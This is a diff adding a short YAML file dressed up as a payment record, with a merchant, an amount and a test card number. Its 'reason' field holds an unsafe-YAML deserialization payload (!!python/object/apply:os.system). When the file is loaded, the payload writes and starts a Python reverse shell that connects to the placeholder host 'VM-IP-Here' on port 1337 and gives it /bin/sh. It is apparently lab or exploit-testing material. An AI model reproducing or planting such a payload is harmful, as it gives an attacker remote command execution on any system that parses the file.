@@ -1,0 +1,5 @@
+name: PayTM Bill payment 3
+reason: !!python/object/apply:os.system ["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"VM-IP-Here\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"]
+merchant: Hello World Traders
+amount: 12
+card: 4111111111111111
